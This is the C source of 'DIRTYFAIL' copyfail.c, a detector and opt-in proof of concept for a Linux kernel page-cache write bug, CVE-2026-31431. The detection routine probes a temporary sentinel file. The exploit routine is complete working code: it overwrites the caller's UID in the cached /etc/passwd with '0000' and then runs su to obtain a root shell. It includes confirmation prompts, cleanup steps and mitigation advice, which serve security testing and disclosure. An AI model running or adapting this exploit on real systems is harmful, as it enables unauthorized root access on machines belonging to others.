/*
 * DIRTYFAIL — copyfail.c — CVE-2026-31431 ("Copy Fail")
 *
 * Detector + opt-in PoC.
 *
 * BACKGROUND
 * ----------
 * The Linux kernel's authencesn(hmac(sha256), cbc(aes)) AEAD template
 * performs a 4-byte "scratch" copy at the end of its destination
 * scatterlist as part of moving the ESN sequence-number high bits
 * around. The crypto code assumes src and dst point at kernel-private
 * memory. They do — except when the AF_ALG socket family is used:
 * algif_aead lets userspace splice() pages into the request, and the
 * AEAD primitive runs in-place. By splicing a page-cache page from a
 * readable file into the request, the scratch write lands in that page
 * cache. The on-disk file is untouched, but the kernel (and every
 * subsequent reader) sees the modified copy until the page is evicted.
 *
 * The 4 bytes that get written are bytes 4..7 of the AAD ("seqno_lo"
 * in the ESP header layout), which userspace controls directly. Net
 * result: an unprivileged 4-byte arbitrary-offset write into any
 * world-readable file's page cache.
 *
 * DETECTION STRATEGY
 * ------------------
 * We never touch system files in detection. Instead we:
 *   1. Confirm AF_ALG + authencesn(...) can be instantiated.
 *   2. Create a sentinel file in $TMPDIR and fault its first page in.
 *   3. Run the exact primitive against the sentinel file with a
 *      recognizable marker ("PWND") in seqno_lo.
 *   4. Re-read the sentinel and look for the marker bytes.
 *
 * If the marker shows up: the kernel just wrote attacker-controlled
 * bytes into a page-cache page over an unmodified disk file. That is
 * the entire vulnerability. Vulnerable.
 *
 * EXPLOIT STRATEGY
 * ----------------
 * /etc/passwd is world-readable and contains a 4-digit UID for normal
 * users (1000-9999). Flipping that UID to "0000" in the page cache
 * makes glibc's getpwnam() report uid=0 for our user. PAM (which still
 * checks /etc/shadow on disk, untouched) accepts the real password,
 * and then setuid(0) lands us at root. Single 4-byte write, fully
 * reversible with POSIX_FADV_DONTNEED.
 */

#include "copyfail.h"

#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <pwd.h>

/* These macros come from <sys/socket.h> on Linux but vary across libcs. */
#ifndef MSG_MORE
#define MSG_MORE 0x8000
#endif

#ifdef __linux__
extern ssize_t splice(int, loff_t *, int, loff_t *, size_t, unsigned int);
#else
/* macOS analysis stub — never called at runtime. */
static ssize_t splice(int a, void *b, int c, void *d, size_t e, unsigned f)
{ (void)a; (void)b; (void)c; (void)d; (void)e; (void)f; errno = ENOSYS; return -1; }
#endif

#define PAGE       4096
#define ASSOCLEN   8     /* SPI(4) || seqno_lo(4) */
#define CRYPTLEN   16    /* one AES block         */
#define TAGLEN     16    /* truncated HMAC-SHA256 */
#define SPLICE_LEN (CRYPTLEN + TAGLEN)
#define ALG_NAME   "authencesn(hmac(sha256),cbc(aes))"
#define MARKER_STR "PWND"

/* ---------------------------------------------------------------- *
 * af_alg_setup_socket()
 *
 * Creates the master AF_ALG socket, binds it to authencesn, sets a
 * zero key (auth+enc), and accept(2)s an op socket. Returns the op fd
 * (or -1 with errno set). On success the master fd is closed before
 * return — we only need the op socket for the actual transaction.
 * ---------------------------------------------------------------- */
static int af_alg_setup_socket(void)
{
    int master = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (master < 0) return -1;

    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
    strncpy((char *)sa.salg_type, "aead",  sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, ALG_NAME, sizeof(sa.salg_name) - 1);
    if (bind(master, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(master);
        return -1;
    }

    /* Auth key (HMAC-SHA256) is 32 bytes; cipher key (AES-128) is 16.
     * We pick zero for both — auth verification will fail at the end
     * (EBADMSG), but the buggy scratch-write fires *before* that, so
     * the page-cache modification persists either way. */
    unsigned char auth[32] = {0}, enc[16] = {0};
    unsigned char keyblob[8 + 32 + 16];
    size_t keylen = build_authenc_keyblob(keyblob, auth, 32, enc, 16);
    if (setsockopt(master, SOL_ALG, ALG_SET_KEY, keyblob, keylen) < 0) {
        close(master);
        return -1;
    }

    int op = accept(master, NULL, NULL);
    int saved = errno;
    close(master);
    errno = saved;
    return op;
}

/* ---------------------------------------------------------------- *
 * af_alg_send_aad()
 *
 * Sends per-op control messages (decrypt, IV, assoclen=8) plus the
 * AAD itself with MSG_MORE. AAD layout:
 *
 *   bytes 0..3   SPI       (we leave zero — the kernel doesn't care)
 *   bytes 4..7   seqno_lo  (this is the 4 bytes that get STOREd)
 *
 * Returns true on success.
 * ---------------------------------------------------------------- */
static bool af_alg_send_aad(int op, const unsigned char four_bytes[4])
{
    unsigned char aad[ASSOCLEN] = { 0 };
    memcpy(aad + 4, four_bytes, 4);

    unsigned int op_decrypt = ALG_OP_DECRYPT;
    unsigned int assoclen   = ASSOCLEN;
    unsigned char iv[20];      /* u32 ivlen + 16-byte IV */
    *(uint32_t *)iv = 16;
    memset(iv + 4, 0, 16);

    /* CMSG_SPACE values for: ALG_SET_OP(u32), ALG_SET_IV(u32+16), ALG_SET_ASSOCLEN(u32). */
    union {
        char buf[CMSG_SPACE(sizeof(unsigned int))
               + CMSG_SPACE(20)
               + CMSG_SPACE(sizeof(unsigned int))];
        struct cmsghdr align;
    } ctrl;
    memset(&ctrl, 0, sizeof(ctrl));

    struct iovec iov = { .iov_base = aad, .iov_len = ASSOCLEN };
    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = ctrl.buf,
        .msg_controllen = sizeof(ctrl.buf),
    };

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_len   = CMSG_LEN(sizeof(unsigned int));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    memcpy(CMSG_DATA(cm), &op_decrypt, sizeof(op_decrypt));

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_len   = CMSG_LEN(20);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    memcpy(CMSG_DATA(cm), iv, 20);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_len   = CMSG_LEN(sizeof(unsigned int));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    memcpy(CMSG_DATA(cm), &assoclen, sizeof(assoclen));

    return sendmsg(op, &msg, MSG_MORE) >= 0;
}

/* ---------------------------------------------------------------- *
 * cf_4byte_write()
 *
 * The whole primitive in one function: open the target, force its
 * page into the cache, set up an AF_ALG op socket, send AAD with our
 * controlled 4 bytes, splice 32 bytes from the target file into the
 * op socket (the kernel uses those page-cache pages as the *destination*
 * of the in-place AEAD), then drive the op via recv() so that the
 * scratch-write fires.
 *
 * `four_bytes` lands at file offset `target_off` of the cached page.
 * Returns true on success (with errno cleared) — but "success" here
 * just means "the syscalls completed". Whether the write actually
 * landed must be confirmed by the caller via a read-back.
 * ---------------------------------------------------------------- */
bool cf_4byte_write(const char *target_path,
                    off_t target_off,
                    const unsigned char four_bytes[4])
{
    int target_fd = open_and_cache(target_path);
    if (target_fd < 0) {
        log_bad("open %s: %s", target_path, strerror(errno));
        return false;
    }

    int op = af_alg_setup_socket();
    if (op < 0) {
        log_bad("AF_ALG setup: %s", strerror(errno));
        close(target_fd);
        return false;
    }

    if (!af_alg_send_aad(op, four_bytes)) {
        log_bad("sendmsg AAD: %s", strerror(errno));
        close(op); close(target_fd);
        return false;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        log_bad("pipe: %s", strerror(errno));
        close(op); close(target_fd);
        return false;
    }

    /* file -> pipe: 32 bytes from offset target_off (CRYPTLEN+TAGLEN). */
    off_t off = target_off;
    ssize_t n1 = splice(target_fd, &off, pipefd[1], NULL, SPLICE_LEN, 0);
    if (n1 != SPLICE_LEN) {
        log_bad("splice file->pipe: got %zd want %d (%s)",
                n1, SPLICE_LEN, strerror(errno));
        close(pipefd[0]); close(pipefd[1]); close(op); close(target_fd);
        return false;
    }

    /* pipe -> op socket: kernel now has page-cache pages in dst SGL. */
    ssize_t n2 = splice(pipefd[0], NULL, op, NULL, SPLICE_LEN, 0);
    close(pipefd[0]); close(pipefd[1]);
    if (n2 != SPLICE_LEN) {
        log_bad("splice pipe->op: got %zd want %d (%s)",
                n2, SPLICE_LEN, strerror(errno));
        close(op); close(target_fd);
        return false;
    }

    /* Drive the AEAD. recv will fail with EBADMSG (auth check fails on
     * our zero key + zero ciphertext); the scratch write has already
     * happened by then. */
    unsigned char drain[256];
    ssize_t r = recv(op, drain, sizeof(drain), 0);
    int saved = errno;
    (void)r;
    close(op);
    close(target_fd);
    errno = (saved == EBADMSG || saved == EINVAL || r >= 0) ? 0 : saved;
    return errno == 0;
}

/* ---------------------------------------------------------------- *
 * Detection
 * ---------------------------------------------------------------- */

df_result_t copyfail_detect(void)
{
    log_step("Copy Fail (CVE-2026-31431) — detection");

    int km = -1, kn = -1;
    if (kernel_version(&km, &kn))
        log_hint("kernel %d.%d.x (affected lines: 6.12, 6.17, 6.18)", km, kn);

    /* Probe AF_ALG availability and instantiation of authencesn. */
    int probe = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (probe < 0) {
        log_ok("AF_ALG socket family unavailable (%s) — NOT vulnerable",
               strerror(errno));
        return DF_PRECOND_FAIL;
    }
    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
    strncpy((char *)sa.salg_type, "aead",  sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, ALG_NAME, sizeof(sa.salg_name) - 1);
    if (bind(probe, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        log_ok("authencesn template not loadable (%s) — NOT vulnerable",
               strerror(errno));
        close(probe);
        return DF_PRECOND_FAIL;
    }
    close(probe);
    log_ok("AF_ALG + %s loadable", ALG_NAME);

    /* Sentinel file probe. */
    char tmpl[] = "/tmp/copyfail-sentinel.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) {
        log_bad("mkstemp: %s", strerror(errno));
        return DF_TEST_ERROR;
    }
    unsigned char sentinel[PAGE];
    for (size_t i = 0; i < PAGE; i += 32)
        memcpy(sentinel + i, "COPYFAIL-SENTINEL-UNCORRUPTED!!\n", 32);
    if (write(sfd, sentinel, PAGE) != PAGE) {
        log_bad("sentinel write: %s", strerror(errno));
        close(sfd); unlink(tmpl);
        return DF_TEST_ERROR;
    }
    close(sfd);

    log_step("triggering primitive against %s with marker '%s'",
             tmpl, MARKER_STR);
    if (!cf_4byte_write(tmpl, 0, (const unsigned char *)MARKER_STR)) {
        unlink(tmpl);
        return DF_TEST_ERROR;
    }

    /* Re-read the sentinel via a fresh fd (page cache, not disk). */
    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    unsigned char after[PAGE];
    ssize_t got = read(rfd, after, PAGE);
    close(rfd);
    unlink(tmpl);
    if (got != PAGE) return DF_TEST_ERROR;

    /* Look for the marker. We expect it to land somewhere inside the
     * 32-byte spliced region (offsets 0..31). */
    unsigned char *hit = memmem(after, 32, MARKER_STR, 4);
    bool orig_has_marker = memmem(sentinel, 32, MARKER_STR, 4) != NULL;
    if (hit && !orig_has_marker) {
        size_t off = hit - after;
        log_warn("VULNERABLE — marker '%s' landed at sentinel offset %zu",
                 MARKER_STR, off);
        log_warn("apply the upstream fix (commit a664bf3d or distro backport)");
        log_warn("interim mitigation: blacklist the algif_aead module");
        return DF_VULNERABLE;
    }

    /* Sometimes the layout puts the scratch write outside the first
     * 32 bytes; check the whole page for ANY divergence. */
    size_t diff_count = 0, first_diff = (size_t)-1;
    for (size_t i = 0; i < PAGE; i++) {
        if (after[i] != sentinel[i]) {
            if (first_diff == (size_t)-1) first_diff = i;
            diff_count++;
        }
    }
    if (diff_count > 0) {
        log_warn("page cache MODIFIED (%zu bytes changed, first at offset %zu)",
                 diff_count, first_diff);
        log_warn("the marker layout differs but the underlying bug class "
                 "still allowed a page-cache page into the AEAD dst SGL");
        return DF_VULNERABLE;
    }

    log_ok("page cache intact — NOT vulnerable on this kernel");
    return DF_OK;
}

/* ---------------------------------------------------------------- *
 * Exploit
 * ---------------------------------------------------------------- */

df_result_t copyfail_exploit(bool do_shell)
{
    log_step("Copy Fail (CVE-2026-31431) — exploit");

    /* Resolve the calling user. We deliberately do not exploit as
     * root or for arbitrary users — only the user who ran us. */
    uid_t uid = getuid();
    if (uid == 0) {
        log_warn("already root — nothing to escalate");
        return DF_OK;
    }
    struct passwd *pw = getpwuid(uid);
    if (!pw) {
        log_bad("getpwuid(%u): %s", uid, strerror(errno));
        return DF_TEST_ERROR;
    }
    const char *user = pw->pw_name;
    log_step("target user: %s (uid %u)", user, uid);

    off_t  uid_off = 0;
    size_t uid_len = 0;
    char   uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("could not find %s in /etc/passwd", user);
        return DF_TEST_ERROR;
    }
    log_step("/etc/passwd: UID field at offset %lld = '%s' (%zu chars)",
             (long long)uid_off, uid_str, uid_len);

    if (uid_len != 4) {
        log_bad("this technique needs a 4-digit UID; got '%s' (%zu chars)",
                uid_str, uid_len);
        log_hint("either pick a different user with a 4-digit UID, or use "
                 "the multi-shot variant (not implemented in DIRTYFAIL).");
        return DF_TEST_ERROR;
    }

    log_warn("about to flip /etc/passwd page cache: '%s' -> '0000'", uid_str);
    log_warn("on-disk file is unchanged. cleanup options:");
    log_warn("  1) DIRTYFAIL --cleanup            (POSIX_FADV_DONTNEED + drop_caches)");
    log_warn("  2) echo 3 > /proc/sys/vm/drop_caches  (from root)");
    log_warn("  3) reboot");
    if (!typed_confirm("DIRTYFAIL")) {
        log_bad("confirmation declined — aborting");
        return DF_OK;
    }
    if (!ssh_lockout_check(user)) {
        log_bad("SSH-lockout confirmation declined — aborting");
        return DF_OK;
    }

    log_step("issuing 4-byte page-cache write...");
    if (!cf_4byte_write("/etc/passwd", uid_off,
                        (const unsigned char *)"0000")) {
        log_bad("primitive failed");
        return DF_EXPLOIT_FAIL;
    }

    /* Verify via a fresh read against the page cache. */
    int v = open("/etc/passwd", O_RDONLY);
    if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
    if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
    char land[5] = {0};
    if (read(v, land, 4) != 4) { close(v); return DF_EXPLOIT_FAIL; }
    close(v);
    if (memcmp(land, "0000", 4) != 0) {
        log_bad("write did not land — page cache reads '%.4s'", land);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("page cache now reports %s with uid 0", user);

    /* Sanity check via libc — getpwnam() walks NSS, which on most
     * systems hits files first, so this should agree with our patch. */
    struct passwd *p = getpwnam(user);
    if (p) log_step("getpwnam('%s').pw_uid = %u", user, p->pw_uid);

    if (!do_shell) {
        if (dirtyfail_no_revert) {
            log_warn("--no-revert: leaving page cache poisoned (run "
                     "`dirtyfail --cleanup` or reboot to revert)");
            return DF_EXPLOIT_OK;
        }
        log_hint("--no-shell selected; reverting page cache");
        if (try_revert_passwd_page_cache())
            log_ok("page cache reverted");
        else
            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
        return DF_EXPLOIT_OK;
    }

    log_ok("invoking 'su %s' — enter your own password to drop into a root shell",
           user);
    log_hint("after exit, run DIRTYFAIL --cleanup or reboot");
    execlp("su", "su", user, (char *)NULL);
    log_bad("execlp su: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}
